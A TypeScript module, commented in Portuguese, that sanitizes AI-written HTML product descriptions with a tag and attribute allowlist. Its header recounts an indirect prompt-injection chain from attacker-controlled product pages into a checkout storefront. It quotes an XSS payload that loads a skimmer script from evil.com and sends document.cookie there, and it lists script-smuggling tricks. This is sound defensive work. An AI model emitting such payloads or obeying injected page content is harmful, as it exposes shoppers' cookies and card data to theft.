import * as cheerio from "cheerio";

/**
 * Allowlist para TODO HTML que a IA escreve.
 *
 * ============================ POR QUE ISTO EXISTE ============================
 *
 * A cadeia completa, confirmada:
 *
 *   pagina de produto de um site qualquer  (conteudo de terceiro)
 *     -> interpolada crua dentro do prompt do neutralizador
 *     -> resposta do modelo
 *     -> descriptionHtml do produto na loja de checkout
 *     -> HTML servido para o comprador
 *
 * A unica limpeza que existia era `stripExternalArtifacts`, que troca a
 * palavra "aliexpress" por vazio. Rodado com este payload:
 *
 *   <p>Tenis</p><script src="https://evil.com/skim.js"></script>
 *   <img src=x onerror="fetch('//evil.com/?c='+document.cookie)">
 *
 * ...saiu identico. `<script>` e `onerror` inteiros, direto para a vitrine.
 *
 * O ponto nao e "o Gemini escreveria isso espontaneamente". E que o texto de
 * ENTRADA vem de um site que o atacante controla, e injecao indireta e
 * exatamente isso: o conteudo pede, o modelo obedece, e a saida vai para uma
 * pagina que cobra cartao.
 *
 * ============================ POR QUE ALLOWLIST ============================
 *
 * Denylist de tag perigosa nao fecha: sobra `onload` em qualquer elemento,
 * `javascript:` em href, `<svg><animate onbegin>`, `<math>`, entidade HTML,
 * atributo sem aspas. Aqui so passa o que esta na lista, e todo o resto e
 * descartado sem tentar adivinhar a intencao.
 *
 * Parser de verdade, nao regex: cheerio ja e dependencia do projeto (o
 * importador usa), entao isto nao acrescenta superficie. Regex em HTML e o
 * mesmo erro do validador de URL que trocamos por parser.
 */

/** Tags que uma descricao de produto realmente usa. */
const TAGS_OK = new Set([
  "p",
  "br",
  "strong",
  "b",
  "em",
  "i",
  "u",
  "s",
  "ul",
  "ol",
  "li",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  "blockquote",
  "span",
  "div",
  "table",
  "thead",
  "tbody",
  "tr",
  "th",
  "td",
  "a",
  "img",
  "figure",
  "figcaption",
  "hr",
  "small",
  "sub",
  "sup",
]);

/** Atributos liberados, por tag. Nenhum `on*` aparece aqui, e nem pode. */
const ATRIBUTOS_OK: Record<string, Set<string>> = {
  a: new Set(["href", "title", "rel", "target"]),
  img: new Set(["src", "alt", "title", "width", "height", "loading"]),
  td: new Set(["colspan", "rowspan"]),
  th: new Set(["colspan", "rowspan", "scope"]),
};

/**
 * Tags cujo CONTEUDO tambem morre.
 *
 * Remover so a tag de <script> deixaria o corpo virar texto visivel na
 * pagina; e de <style> deixaria CSS solto no meio da descricao.
 */
const TAGS_COM_CONTEUDO = new Set([
  "script",
  "style",
  "iframe",
  "object",
  "embed",
  "template",
  "noscript",
  "svg",
  "math",
  "form",
  "input",
  "button",
  "textarea",
  "select",
  "link",
  "meta",
  "base",
  "frame",
  "frameset",
]);

/** Teto de tamanho para HTML escrito por IA. */
export const MAX_HTML = 60_000;

/** Esquemas de URL aceitos em href/src. */
const ESQUEMAS_OK = new Set(["http:", "https:", "mailto:"]);

/**
 * Aprova (ou nao) uma URL de atributo.
 *
 * `javascript:` e o obvio. `data:` fica de fora porque `data:text/html` roda
 * script, e nao vale a pena separar os subtipos aqui.
 */
function urlDeAtributoOk(valor: string): boolean {
  const bruto = valor.trim();
  if (!bruto) return false;
  // Relativa: nao carrega esquema, entao nao executa nada.
  if (bruto.startsWith("/") && !bruto.startsWith("//")) return true;

  // Entidade HTML e caractere de controle no meio do esquema
  // ("java\tscript:", "&#106;avascript:") sao o jeito classico de escapar de
  // uma checagem que so olha o comeco da string.
  if (/[\x00-\x1f\x7f]/.test(bruto) || bruto.includes("&#")) return false;

  try {
    const url = new URL(bruto, "https://base.invalid");
    return ESQUEMAS_OK.has(url.protocol);
  } catch {
    return false;
  }
}

export interface ResultadoSanitizacao {
  html: string;
  /** O que foi retirado. Vai para o log -- e sinal de injecao, nao ruido. */
  removidos: string[];
}

/**
 * Devolve HTML seguro para publicar, mais a lista do que foi tirado.
 *
 * Nunca lanca: entrada torta vira string vazia. Uma descricao perdida e
 * problema pequeno; uma excecao no meio da importacao derruba o lote inteiro.
 */
export function sanitizarHtmlDaIa(entrada: unknown): ResultadoSanitizacao {
  const removidos: string[] = [];
  if (typeof entrada !== "string" || !entrada.trim()) {
    return { html: "", removidos };
  }

  // Teto de tamanho: a descricao vai para a Shopify e para a pagina. Um modelo
  // em loop (ou instruido a repetir) produz megabytes com facilidade.
  const bruto = entrada.slice(0, MAX_HTML);
  if (entrada.length > MAX_HTML) removidos.push(`truncado em ${MAX_HTML} chars`);

  let $: cheerio.CheerioAPI;
  try {
    $ = cheerio.load(bruto, null, false);
  } catch {
    return { html: "", removidos: [...removidos, "html ilegivel"] };
  }

  $("*").each((_, el) => {
    // ATENCAO ao tipo do no.
    //
    // No domhandler, <script> tem type "script" e <style> tem type "style" --
    // NAO "tag". A guarda `el.type !== "tag"` pulava exatamente os dois
    // elementos mais perigosos da lista, e eles saiam intactos. Foi o teste
    // de XSS que pegou isso; a leitura do codigo nao pegaria.
    const tag = (el as { tagName?: string }).tagName?.toLowerCase() || "";
    if (!tag) return;

    if (TAGS_COM_CONTEUDO.has(tag)) {
      removidos.push(`<${tag}> (com conteudo)`);
      $(el).remove();
      return;
    }

    if (!TAGS_OK.has(tag)) {
      // Tag desconhecida: tira a tag mas mantem o texto de dentro, que
      // costuma ser conteudo legitimo mal marcado pelo modelo.
      removidos.push(`<${tag}>`);
      $(el).replaceWith($(el).contents());
      return;
    }

    const permitidos = ATRIBUTOS_OK[tag];
    const attribs = (el as { attribs?: Record<string, string> }).attribs || {};
    for (const nome of Object.keys(attribs)) {
      const chave = nome.toLowerCase();
      if (!permitidos || !permitidos.has(chave)) {
        // Pega on* junto: nenhum handler esta em nenhuma allowlist.
        removidos.push(`${tag}[${chave}]`);
        $(el).removeAttr(nome);
        continue;
      }
      if ((chave === "href" || chave === "src") && !urlDeAtributoOk(attribs[nome])) {
        removidos.push(`${tag}[${chave}] url recusada`);
        $(el).removeAttr(nome);
      }
    }

    // Link para fora sem rel: o alvo consegue mexer em window.opener.
    if (tag === "a" && $(el).attr("target") === "_blank") {
      $(el).attr("rel", "noopener noreferrer");
    }
  });

  return { html: $.html().trim(), removidos };
}

/** Versao curta, quando o chamador so quer o HTML. */
export function htmlSeguroDaIa(entrada: unknown): string {
  return sanitizarHtmlDaIa(entrada).html;
}

/**
 * Texto puro escrito por IA (titulo, SEO, tag).
 *
 * Aqui nao ha HTML legitimo: remove marcacao inteira, controla tamanho e tira
 * caractere de controle -- inclusive os invisiveis que servem para esconder
 * instrucao dentro de um titulo.
 */
export function textoSeguroDaIa(entrada: unknown, maxLen: number): string {
  if (typeof entrada !== "string") return "";
  return entrada
    .replace(/<[^>]*>/g, " ")
    // Controle + separadores de linha + marcas invisiveis (zero-width,
    // bidi override): nada disso tem uso em titulo de produto.
    .replace(/[\u0000-\u001f\u007f\u200b-\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069\ufeff]/g, "")
    .replace(/\s{2,}/g, " ")
    .trim()
    .slice(0, maxLen);
}
